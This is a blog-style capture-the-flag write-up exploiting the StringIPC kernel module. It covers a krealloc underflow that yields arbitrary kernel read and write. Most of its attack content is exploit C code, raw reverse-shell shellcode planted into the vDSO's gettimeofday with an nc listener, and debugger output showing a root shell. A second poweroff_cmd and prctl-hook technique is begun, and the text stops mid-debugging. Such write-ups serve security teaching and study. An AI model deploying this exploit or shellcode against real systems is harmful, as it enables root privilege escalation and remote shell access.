---
layout: post
title: "StringIPC: where poweroff and gettimeofday mean #(uid=0) reverse shell"
categories: Pwn Kernel
tags: Hacking Pwn
---

This last blog of the year aims to be my best written and most detailed article, where I show techniques that are not too well known (could it have been solved in a simpler way? Yes, but I'm a masochist :).
<!--excerpt-->

We can get the source code of the kernel module [here](https://github.com/mncoppola/StringIPC/blob/master/main.c).
If we analyze the source code we can see a lot of ioctl requests

```c
#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8
```
So from `/dev/cswa` through ioctl we can:
-Allocate a new IPC
```c
int alloc_new_ipc_channel ( size_t buf_size, struct ipc_channel **out_channel )
{
    int id;
    char *data;
    struct ipc_channel *channel;

    if ( ! buf_size )
        return -EINVAL;

    channel = kzalloc(sizeof(*channel), GFP_KERNEL);
    if ( channel == NULL )
        return -ENOMEM;

    data = kzalloc(buf_size, GFP_KERNEL);
    if ( data == NULL )
    {
        kfree(channel);
        return -ENOMEM;
    }

    kref_init(&channel->ref);

    channel->data = data;
    channel->buf_size = buf_size;

    id = idr_alloc(&ipc_idr, channel, 1, 0, GFP_KERNEL);
    if ( id < 0 )
    {
        kfree(data);
        kfree(channel);
        return id;
    }

    channel->id = id;
    *out_channel = channel;

    return 0;
}
```
-Open an existing IPC
```c
static struct ipc_channel *get_channel_by_id ( struct ipc_state *state, int id )
{
    struct ipc_channel *channel;

    channel = idr_find(&ipc_idr, id);
    if ( channel )
        ipc_channel_get(channel);

    if ( channel )
        return channel;
    else
        return ERR_PTR(-EINVAL);
}
```
-Grow/Shrink (so resize) an IPC
```c
static int realloc_ipc_channel ( struct ipc_state *state, int id, size_t size, int grow )
{
    struct ipc_channel *channel;
    size_t new_size;
    char *new_data;

    channel = get_channel_by_id(state, id);
    if ( IS_ERR(channel) )
        return PTR_ERR(channel);

    if ( grow )
        new_size = channel->buf_size + size;
    else
        new_size = channel->buf_size - size;

    new_data = krealloc(channel->data, new_size + 1, GFP_KERNEL);
    if ( new_data == NULL )
        return -EINVAL;

    channel->data = new_data;
    channel->buf_size = new_size;

    ipc_channel_put(state, channel);

    return 0;
}
```
-Read from an IPC, we can use to leak stuff
```c
static ssize_t read_ipc_channel ( struct ipc_state *state, char __user *buf, size_t count )
{
    struct ipc_channel *channel;
    loff_t *pos;

    if ( ! state->channel )
        return -ENXIO;

    channel = state->channel;
    pos = &channel->index;

    if ( (count + *pos) > channel->buf_size )
        return -EINVAL;

    if ( copy_to_user(buf, channel->data + *pos, count) )
        return -EINVAL;

    return count;
}
```
-Write to an IPC
```c
static ssize_t write_ipc_channel ( struct ipc_state *state, const char __user *buf, size_t count )
{
    struct ipc_channel *channel;
    loff_t *pos;

    if ( ! state->channel )
        return -ENXIO;

    channel = state->channel;
    pos = &channel->index;

    if ( (count + *pos) > channel->buf_size )
        return -EINVAL;

    if ( strncpy_from_user(channel->data + *pos, buf, count) < 0 )
        return -EINVAL;

    return count;
}
```
-Seek (so set/get) the address we are inside an IPC 
```c
static loff_t seek_ipc_channel ( struct ipc_state *state, loff_t offset, int whence )
{
    loff_t ret = -EINVAL;
    struct ipc_channel *channel = state->channel;

    if ( ! channel )
        return -ENXIO;

    switch ( whence )
    {
        case SEEK_SET:
            if ( offset < channel->buf_size )
            {
                channel->index = offset;
                ret = offset;
            }
            break;

        case SEEK_CUR:
            ret = channel->index;
            break;
    }

    return ret;
}
```
-Close an IPC
```c
static int close_ipc_channel ( struct ipc_state *state, int id )
{
    struct ipc_channel *channel;

    channel = get_channel_by_id(state, id);
    if ( IS_ERR(channel) )
        return PTR_ERR(channel);

    if ( state->channel == channel )
    {
        state->channel = NULL;
        ipc_channel_put(state, channel);
    }

    ipc_channel_put(state, channel);

    return 0;
}
```
There are also two important structs:
```c
struct ipc_channel {
    struct kref ref;
    int id;
    char *data;
    size_t buf_size;
    loff_t index;
};
```
In ipc_state is stored the state of every IPC session
```c
struct ipc_state {
    struct ipc_channel *channel;
    struct mutex lock;
};
```
But what exactly is an IPC, from wikipedia we get:
```
In computer science, inter-process communication (IPC) are the mechanisms provided by an operating system for processes, to manage shared data.
```

So analyzing the source code of the function we and easily spot interesting functions such as `CSAW_SEEK_CHANNEL`, `CSAW_READ_CHANNEL`, and `CSAW_WRITE_CHANNEL`, with those we can achieve  an arbitrary kernel read and write primitive.  Avoiding the Alloc, Open and Close ioctls, we have the GROW and SHRINK ones. Both make a call to krealloc(),  this function allocates a new buffer of the given size, and if successful copies the contents, frees the old buffer, and returns the pointer to the new buffer. The vulnerability is the lack of a check, this realloc function only check when it returns NULL. If we see the definition of krealloc
```c
/**
 * krealloc - reallocate memory. The contents will remain unchanged.
 * @p: object to reallocate memory for.
 * @new_size: how many bytes of memory are required.
 * @flags: the type of memory to allocate.
 *
 * The contents of the object pointed to are preserved up to the
 * lesser of the new and old sizes.  If @p is %NULL, krealloc()
 * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a
 * %NULL pointer, the object pointed to is freed.
 */
void *krealloc(const void *p, size_t new_size, gfp_t flags)
{
	void *ret;

	if (unlikely(!new_size)) {
		kfree(p);
		return ZERO_SIZE_PTR;
	}

	ret = __do_krealloc(p, new_size, flags);
	if (ret && p != ret)
		kfree(p);

	return ret;
}
EXPORT_SYMBOL(krealloc);
```
where ZERO_SIZE_PTR is:
```c
/*
 * ZERO_SIZE_PTR will be returned for zero sized kmalloc requests.
 *
 * Dereferencing ZERO_SIZE_PTR will lead to a distinct access fault.
 *
 * ZERO_SIZE_PTR can be passed to kfree though in the same way that NULL can.
 * Both make kfree a no-op.
 */
#define ZERO_SIZE_PTR ((void *)16)
```
So setting new_size to -1, we get a channel with size: 0xffffffffffffffff, since buf_size is defined as unsigned.
So for now we can write the setup of our kernel exploit:
```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE + 1
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE + 3
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE + 5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE + 6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE + 7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE + 8
#define SEEK_SET    0
typedef unsigned long loff_t;
struct alloc_channel_args {
    size_t buf_size;
    int id;
};
struct grow_channel_args {
    int id;
    size_t size;
};
struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};
struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};
struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};
struct close_channel_args {
    int id;
};
int fd;

int main(){

        fd = open("/dev/csaw", O_RDWR);
        if (fd < 0){return -1;}
        return 0;
}
```
Let's see which kernel mitigation are enabled:
```sh
qemu-system-x86_64 \
-m 256M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
-cpu qemu64,+smep,+smap \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-gdb tcp: 1234 \
-nographic  -enable-kvm
```
So no kaslr, but the script works even with kaslr because we are going to leak some stuff...
There are SMEP and SMAP, but actually they are not really a problem we have probably the best primitive (Arbitrary Read & Write)...
Also those line from init script:
```sh
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
```
And for debugging I changed to:
```sh
echo 0 > /proc/sys/kernel/kptr_restrict
echo 0 > /proc/sys/kernel/dmesg_restrict
```
At the start of this blog I stated we will exploit this kernel module thanks to VDSO, but what is it? From wikipedia:
```
vDSO (virtual dynamic shared object) is a kernel mechanism for exporting a carefully selected set of kernel space routines to user space applications so that applications can call these kernel space routines in-process, without incurring the performance penalty of a mode switch from user mode to kernel mode that is inherent when calling these same kernel space routines by means of the system call interface
```
Open a binary in gdb, start it and see the mappings:
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555558000 r--p     4000      0 /usr/bin/dash
    0x555555558000     0x55555556c000 r-xp    14000   4000 /usr/bin/dash
    0x55555556c000     0x555555571000 r--p     5000  18000 /usr/bin/dash
    0x555555571000     0x555555573000 r--p     2000  1c000 /usr/bin/dash
    0x555555573000     0x555555574000 rw-p     1000  1e000 /usr/bin/dash
    0x555555574000     0x555555576000 rw-p     2000      0 [heap]
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dbd000     0x7ffff7e15000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e15000     0x7ffff7e19000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e19000     0x7ffff7e1b000 rw-p     2000 218000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e1b000     0x7ffff7e28000 rw-p     d000      0 [anon_7ffff7e1b]
    0x7ffff7fa7000     0x7ffff7faa000 rw-p     3000      0 [anon_7ffff7fa7]
    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000      0 [anon_7ffff7fbb]
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 [vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000      0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```
We can also dump it, but we will dump it from the kernel: (post scriptum)
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
0xffff880000000000 0xffff880000486000 rw-p   486000      0 <explored>
0xffff88000c210000 0xffff88000ca10000 rw-p   800000      0 <explored>
0xffffffff81000000 0xffffffff81463000 rw-p   463000      0 <explored>
0xffffffff81611000 0xffffffff81e11000 rw-p   800000      0 <explored>
0xffffffff81b68000 0xffffffff82368000 rw-p   800000      0 <explored>

[QEMU target detected - vmmap result might not be accurate; see `help vmmap`]
pwndbg> xinfo 0xffffffff81e04000
Extended information for virtual address 0xffffffff81e04000:

  Containing mapping:
0xffffffff81611000 0xffffffff81e11000 rw-p   800000      0 <explored>

  Offset information:
         Mapped Area 0xffffffff81e04000 = 0xffffffff81611000 + 0x7f3000
         File (Base) 0xffffffff81e04000 = 0xffff880000000000 + 0x77ff81e04000
Exception occurred: xinfo: get_file called with incorrect path (<class 'AssertionError'>)
For more info invoke `set exception-verbose on` and rerun the command
or debug it by yourself with `set exception-debugger on`
pwndbg> dump binary memory vd 0xffffffff81e04000 0xffffffff81e06000
```

So VDSO is an ELF binary embedded in the kernel (see the address from gdb) that contains important kernel routines, we can consider it as a LIBC for the kernel. 
For more info check [this article](https://man7.org/linux/man-pages/man7/vdso.7.html)

# Attack Plan
 1. Leak VDSO base address
 2. Overwrite some of its function
 3. Get r00t!

## Leak
From that article the trick is pretty neat, we have to use 'getauxval()', also for searching the functions we can use that dump just remember
```
Typically the vDSO follows the naming convention of prefixing all
symbols with "__vdso_" or "__kernel_" so as to distinguish them
from other standard symbols.  For example, the "gettimeofday"
function is named "__vdso_gettimeofday".
```
So we have to do something like this:
```sh
$ strings -t x vd|grep "__vdso"
    2b1 __vdso_clock_gettime
    2c6 __vdso_gettimeofday
    2da __vdso_time
    2e6 __vdso_getcpu
```
So first we create a new IPC:
```c
struct alloc_channel_args alloc_channel;
alloc_channel.buf_size = 0x2000;
ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
int id = alloc_channel.id;
printf("[+] channel id: %d\n", id);
```
Then we resize it with the krealloc bug:
```c
struct grow_channel_args grow_channel;
grow_channel.id = id;
grow_channel.size = 0xffffffffffffffff - alloc_channel.buf_size;
ioctl(fd, CSAW_GROW_CHANNEL, &grow_channel);
```
Then we can finally leak the vdso with:
```c
//Structure for seek
struct seek_channel_args seek_channel;
seek_channel.id = id;
seek_channel.whence = SEEK_SET;
//Structure for read 
struct read_channel_args read_channel;
char *buf = (char *)malloc(alloc_channel.buf_size);
memset((void *)buf, 0, alloc_channel.buf_size);
read_channel.id = alloc_channel.id;
read_channel.buf = buf;
read_channel.count = 0x2000;
unsigned long vdso = 0xffffffff81000000; //No KASLR, so let's start from k_base
for (; vdso < 0xffffffffffffefff; vdso += 0x1000) {
	seek_channel.index = vdso - 0x10; // 0x10 from channel.data
	ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);
	ioctl(fd, CSAW_READ_CHANNEL, &read_channel);
	if (!strcmp(buf + 0x2c6, "__vdso_gettimeofday")) {
		printf("[+] kernel vDSO address: %p\n", (void *)vdso);
		break;
	}
}
```
Let's run our exploit:
```
/ # ./exp
[+] channel id: 1
[+] kernel vDSO address: 0xffffffff81e04000
```
An interesting thing is that we can find it also thanks to /proc/kallsyms
```
/ $ cat /tmp/kallsyms |grep ffffffff81e04
ffffffff81e04000 d raw_data
```
Because is an ELF the vdso, when we see the string referred to its address we can see:
```
pwndbg> x/s 0xffffffff81e04000
0xffffffff81e04000:	"\177ELF\002\001\001"
```
And we can also make sure to find `__vdso_gettimeofday`:
```
pwndbg> x/s 0xffffffff81e04000+0x2c6
0xffffffff81e042c6:	"__vdso_gettimeofday"
```

## Overwrite `__vdso_gettimeofday`
Now we can use  this [shellcode](https://gist.github.com/itsZN/1ab36391d1849f15b785)
```c
char shellcode[] = "\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";
```
The shellcode is a reverse shell on port 3333.
So first of all we need to get the address of 'gettimeofday'
```
pwndbg> x/s 0x7ffff7ffe000
0x7ffff7ffe000:	"\177ELF\002\001\001"
pwndbg> p __vdso_gettimeofday 
$3 = {<text variable, no debug info>} 0x7ffff7ffec80 <gettimeofday>
pwndbg> p/x 0x7ffff7ffec80 - 0x7ffff7ffe000
$4 = 0xc80
```
where the first address is the file base
```
pwndbg> xinfo 0x7ffff7ffe000
Extended information for virtual address 0x7ffff7ffe000:

  Containing mapping:
    0x7ffff7ffe000     0x7ffff7fff000 r-xp     1000      0 /home/kctf/stringipc/stringipc/vd

  Offset information:
         Mapped Area 0x7ffff7ffe000 = 0x7ffff7ffe000 + 0x0
         File (Base) 0x7ffff7ffe000 = 0x7ffff7ffe000 + 0x0
      File (Segment) 0x7ffff7ffe000 = 0x7ffff7ffe000 + 0x0
         File (Disk) 0x7ffff7ffe000 = /home/kctf/stringipc/stringipc/vd + 0x0
```
So to overwrite it we can easily do:
```c
seek_channel.id = id; 
seek_channel.index = vdso -0x10 + 0xc80; // -0x10 is for new_data 
seek_channel.whence= SEEK_SET; 
ioctl(fd,CSAW_SEEK_CHANNEL,&seek_channel); 
struct write_channel_args write_channel;
write_channel.id = id; 
write_channel.buf = shellcode; 
write_channel.count =  strlen (shellcode); 
ioctl(fd,CSAW_WRITE_CHANNEL,&write_channel);
```
We can be sure to have overwritten gettimeofday by checking within gdb the instructions at that address:
GDB:
```
pwndbg> x/40gx 0xffffffff81e04000+0xc80
0xffffffff81e04c80:	0x0f66b0c031485390	0x75c33948db314805
0xffffffff81e04c90:	0x050f39b0c031480f	0x0974d83948db3148
0xffffffff81e04ca0:	0x050f60b0c031485b	0x6a5e016ad23148c3
0xffffffff81e04cb0:	0x48050f58296a5f02	0xfaf2fffdb9485097
0xffffffff81e04cc0:	0x51d1f748feffff80	0x2a6a5a106ae68948
0xffffffff81e04cd0:	0x3948db3148050f58	0xe7b0c031480774d8
0xffffffff81e04ce0:	0x216a5e036a90050f	0xf675050fceff4858
0xffffffff81e04cf0:	0x9dd0bb4850c03148	0xf748ff978cd09196
0xffffffff81e04d00:	0x485750e7894853d3	0x0f3bb0d23148e689
0xffffffff81e04d10:	0x050fe7b0c0314805	0xc9fff98148c46536
0xffffffff81e04d20:	0x49e4458bea773b9a	0xc085084b89491301
0xffffffff81e04d30:	0x894800000092840f	0xa5e353f7cfba48c8
0xffffffff81e04d40:	0x8948eaf74820c49b	0xfac1483ff8c148c8
0xffffffff81e04d50:	0x08538949c2294807	0x485675f68548c031
0xffffffff81e04d60:	0x5d415c415b10c483	0xffffd380058bc35d
0xffffffff81e04d70:	0x8bffffc311052b48	0x052348ffffc31b15
0xffffffff81e04d80:	0xc2af0f48ffffc30c	0xe7894cffffff5ce9
0xffffffff81e04d90:	0xfffbd7e8d8758948	0x48d1ebd8758b48ff
0xffffffff81e04da0:	0xfffffb98e8d87589	0x90f3c2ebd8758b48
0xffffffff81e04db0:	0x25158bfffffee8e9	0x21158b1689ffffc3
pwndbg> x/40i 0xffffffff81e04000+0xc80
   0xffffffff81e04c80:	nop
   0xffffffff81e04c81:	push   rbx
   0xffffffff81e04c82:	xor    rax,rax
   0xffffffff81e04c85:	mov    al,0x66
   0xffffffff81e04c87:	syscall 
   0xffffffff81e04c89:	xor    rbx,rbx
   0xffffffff81e04c8c:	cmp    rbx,rax
   0xffffffff81e04c8f:	jne    0xffffffff81e04ca0
   0xffffffff81e04c91:	xor    rax,rax
   0xffffffff81e04c94:	mov    al,0x39
   0xffffffff81e04c96:	syscall 
   0xffffffff81e04c98:	xor    rbx,rbx
   0xffffffff81e04c9b:	cmp    rax,rbx
   0xffffffff81e04c9e:	je     0xffffffff81e04ca9
   0xffffffff81e04ca0:	pop    rbx
   0xffffffff81e04ca1:	xor    rax,rax
   0xffffffff81e04ca4:	mov    al,0x60
   0xffffffff81e04ca6:	syscall 
   0xffffffff81e04ca8:	ret    
   0xffffffff81e04ca9:	xor    rdx,rdx
   0xffffffff81e04cac:	push   0x1
   0xffffffff81e04cae:	pop    rsi
   0xffffffff81e04caf:	push   0x2
   0xffffffff81e04cb1:	pop    rdi
   0xffffffff81e04cb2:	push   0x29
   0xffffffff81e04cb4:	pop    rax
   0xffffffff81e04cb5:	syscall 
   0xffffffff81e04cb7:	xchg   rdi,rax
   0xffffffff81e04cb9:	push   rax
   0xffffffff81e04cba:	movabs rcx,0xfeffff80faf2fffd
   0xffffffff81e04cc4:	not    rcx
   0xffffffff81e04cc7:	push   rcx
   0xffffffff81e04cc8:	mov    rsi,rsp
   0xffffffff81e04ccb:	push   0x10
   0xffffffff81e04ccd:	pop    rdx
   0xffffffff81e04cce:	push   0x2a
   0xffffffff81e04cd0:	pop    rax
   0xffffffff81e04cd1:	syscall 
   0xffffffff81e04cd3:	xor    rbx,rbx
   0xffffffff81e04cd6:	cmp    rax,rbx
```
The original:
~~~nasm
nop
push rbx
xor rax,rax
mov al, 0x66
syscall #check uid
xor rbx,rbx
cmp rbx,rax
jne emulate #If not root, only emulate.

xor rax,rax
mov al,0x39
syscall #fork
xor rbx,rbx
cmp rax,rbx
je connectback

emulate:
pop rbx
xor rax,rax
mov al,0x60
syscall
retq

connectback:
xor rdx,rdx
pushq 0x1
pop rsi
pushq 0x2
pop rdi
pushq 0x29
pop rax 
syscall #socket

xchg rdi,rax
push rax
mov rcx, 0xfeffff80faf2fffd #NOT'ed 127.0.0.1:3333
not rcx
push rcx
mov rsi,rsp
pushq 0x10
pop rdx
pushq 0x2a
pop rax
syscall #connect

xor rbx,rbx
cmp rax,rbx
~~~
So just checking the first 40 instructions between gdb and the original shellcode we can conclude to have successfully overwritten gettimeofday.

So to execute gettimeofday I created a new process with fork() and made it execute  directly by accessing its address and by a normal call:
```c
if (fork() == 0){
	((void(*)(void))0xffffffff81e04c80)();
	gettimeofday(NULL, NULL);
	exit(-1);
}
system("nc -lp 3333");
```
Executing our payload we get:
```
/ $ /exp 
[+] channel id: 1
[+] kernel vDSO address: 0xffffffff81e04000
id
uid=0(root) gid=0(root)
cat flag
this is a sample flag
```
## Other Exploit Technique: poweroff_cmd -> prctl

So we will leak some kernel address...
Starting from kernel base, there is no kaslr so the base address is 0xffffffff81000000, the other addresses are:
```
ffffffff810a39c0 t poweroff_work_func
ffffffff81e4dfa0 D poweroff_cmd
```
This time we will use poweroff_cmd, just check the source code:
```c
static char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";
```
It is a static variable, so is a perfect target for modprob_path like attacks... `poweroff_work_func` is the function that will execute the malicious command...
```c
static bool poweroff_force;

static void poweroff_work_func(struct work_struct *work)
{
	__orderly_poweroff(poweroff_force);
}
```
Where `__orderly_poweroff` is defined as follows:
```c
static int __orderly_poweroff(bool force)
{
	int ret;

	ret = run_cmd(poweroff_cmd);

	if (ret && force) {
		pr_warn("Failed to start orderly shutdown: forcing the issue\n");

		/*
		 * I guess this should try to kick off some daemon to sync and
		 * poweroff asap.  Or not even bother syncing if we're doing an
		 * emergency shutdown?
		 */
		emergency_sync();
		kernel_power_off();
	}

	return ret;
}
```
And here `run_cmd` is:
```c
static int run_cmd(const char *cmd)
{
	char **argv;
	static char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};
	int ret;
	argv = argv_split(GFP_KERNEL, cmd, NULL);
	if (argv) {
		ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
		argv_free(argv);
	} else {
		ret = -ENOMEM;
	}

	return ret;
}
```
So we will exploit the `call_usermodhelper` by overwriting `poweroff_cmd`. The only difference from something like `core_pattern` or `modprob_path` is that there is no clear way to execute the poweroff function from userland... So we need to like recall it, but how???
There is a solution: controlling `prctl`...
Prctl is a linux function that help controlling and modifying settings for processes and threads, so hijacking it can make us point to other kernel's functions such as `call_usermodehelper`.  Let's analyze the source,[here the full code](https://elixir.bootlin.com/linux/latest/source/kernel/sys.c#L2432)
```c
SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
		unsigned long, arg4, unsigned long, arg5)
{
	struct task_struct *me = current;
	unsigned char comm[sizeof(me->comm)];
	long error;

	error = security_task_prctl(option, arg2, arg3, arg4, arg5);
	if (error != -ENOSYS)
		return error;
```
Where `security_task_prctl` is defined as:
```c
/**
 * security_task_prctl() - Check if a prctl op is allowed
 * @option: operation
 * @arg2: argument
 * @arg3: argument
 * @arg4: argument
 * @arg5: argument
 *
 * Check permission before performing a process control operation on the
 * current process.
 *
 * Return: Return -ENOSYS if no-one wanted to handle this op, any other value
 *         to cause prctl() to return immediately with that value.
 */
int security_task_prctl(int option, unsigned long arg2, unsigned long arg3,
			unsigned long arg4, unsigned long arg5)
{
	int thisrc;
	int rc = LSM_RET_DEFAULT(task_prctl);
	struct security_hook_list *hp;

	hlist_for_each_entry(hp, &security_hook_heads.task_prctl, list) {
		thisrc = hp->hook.task_prctl(option, arg2, arg3, arg4, arg5);
		if (thisrc != LSM_RET_DEFAULT(task_prctl)) {
			rc = thisrc;
			if (thisrc != 0)
				break;
		}
	}
	return rc;
}
```
So what we are really hacking is the `task_prctl` table, let's go find that address.
First find the address of `security_task_prctl`:
```
/ $ cat /tmp/kallsyms |grep security_task_prctl
ffffffff813467b0 T security_task_prctl
```
And break in gdb at that address. Execute a small binary like this to successfully break there:
```c
#include <stdio.h>

int main(){
	prctl(0,0);
	return 0;
}
```
Printing the instruction that will get executed we easily see where the `task_prctl` is:
```
pwndbg> x/100i $rip
=> 0xffffffff813467b0 <security_task_prctl>:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff813467b5 <security_task_prctl+5>:	push   rbp
   0xffffffff813467b6 <security_task_prctl+6>:	mov    rbp,rsp
   0xffffffff813467b9 <security_task_prctl+9>:	push   r15
   0xffffffff813467bb <security_task_prctl+11>:	push   r14
   0xffffffff813467bd <security_task_prctl+13>:	push   r13
   0xffffffff813467bf <security_task_prctl+15>:	push   r12
   0xffffffff813467c1 <security_task_prctl+17>:	mov    r15d,0xffffffda
   0xffffffff813467c7 <security_task_prctl+23>:	push   rbx
   0xffffffff813467c8 <security_task_prctl+24>:	sub    rsp,0x10
   0xffffffff813467cc <security_task_prctl+28>:	mov    rbx,QWORD PTR [rip+0xb71d9d]        # 0xffffffff81eb8570
   0xffffffff813467d3 <security_task_prctl+35>:	mov    QWORD PTR [rbp-0x30],rcx
   0xffffffff813467d7 <security_task_prctl+39>:	mov    QWORD PTR [rbp-0x38],r8
   0xffffffff813467db <security_task_prctl+43>:	cmp    rbx,0xffffffff81eb8570
   0xffffffff813467e2 <security_task_prctl+50>:	je     0xffffffff81346819 <security_task_prctl+105>
   0xffffffff813467e4 <security_task_prctl+52>:	mov    r14d,edi
   0xffffffff813467e7 <security_task_prctl+55>:	mov    r13,rsi
   0xffffffff813467ea <security_task_prctl+58>:	mov    r12,rdx
   0xffffffff813467ed <security_task_prctl+61>:	mov    r8,QWORD PTR [rbp-0x38]
   0xffffffff813467f1 <security_task_prctl+65>:	mov    rcx,QWORD PTR [rbp-0x30]
   0xffffffff813467f5 <security_task_prctl+69>:	mov    rdx,r12
   0xffffffff813467f8 <security_task_prctl+72>:	mov    rsi,r13
   0xffffffff813467fb <security_task_prctl+75>:	mov    edi,r14d
   0xffffffff813467fe <security_task_prctl+78>:	call   QWORD PTR [rbx+0x18]
   [...]
```
From `security_task_prctl+52` it is setting the argument as we saw earlier
(`hp->hook.task_prctl(option, arg2, arg3, arg4, arg5)`). Stop the execution at 0xffffffff813467fe, examine $rbx and add 0x18:
```
pwndbg> c
Continuing.

Breakpoint 2, 0xffffffff813467fe in security_task_prctl ()
Permission error when attempting to parse page tables with gdb-pt-dump.
Either change the kernel-vmmap setting, re-run GDB as root, or disable `ptrace_scope` (`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`)
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────
 RAX  0xffff88000766e7c0 ◂:  0x0
 RBX  0xffffffff81eb7de0 (capability_hooks+416) : ▸ 0xffffffff81ec0ca0 (yama_hooks+64) : ▸ 0xffffffff81eb8570 (security_hook_heads+1744) ◂:  0xffffffff81eb7de0
 RCX  0x0
 RDX  0x7ffe6e1344a8 : ▸ 0x7ffe6e134fcc ◂:  0x323d4c564c4853 /* 'SHLVL=2' */
 RDI  0x0
 RSI  0x0
 R8   0x20000
 R9   0x0
 R10  0x0
 R11  0x246
 R12  0x7ffe6e1344a8 : ▸ 0x7ffe6e134fcc ◂:  0x323d4c564c4853 /* 'SHLVL=2' */
 R13  0x0
 R14  0x0
 R15  0xffffffda
 RBP  0xffff88000fbb3ee8 : ▸ 0xffff88000fbb3f48 : ▸ 0x7ffe6e134450 ◂:  0x1
 RSP  0xffff88000fbb3eb0 ◂:  0x20000
*RIP  0xffffffff813467fe (security_task_prctl+78) ◂:  0x774daf8831853ff
────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────
   0xffffffff813467ed <security_task_prctl+61>    mov    r8, qword ptr [rbp - 0x38]
   0xffffffff813467f1 <security_task_prctl+65>    mov    rcx, qword ptr [rbp - 0x30]
   0xffffffff813467f5 <security_task_prctl+69>    mov    rdx, r12
   0xffffffff813467f8 <security_task_prctl+72>    mov    rsi, r13
   0xffffffff813467fb <security_task_prctl+75>    mov    edi, r14d
 ► 0xffffffff813467fe <security_task_prctl+78>    call   qword ptr [rbx + 0x18]        <cap_task_prctl>
        rdi: 0x0
        rsi: 0x0
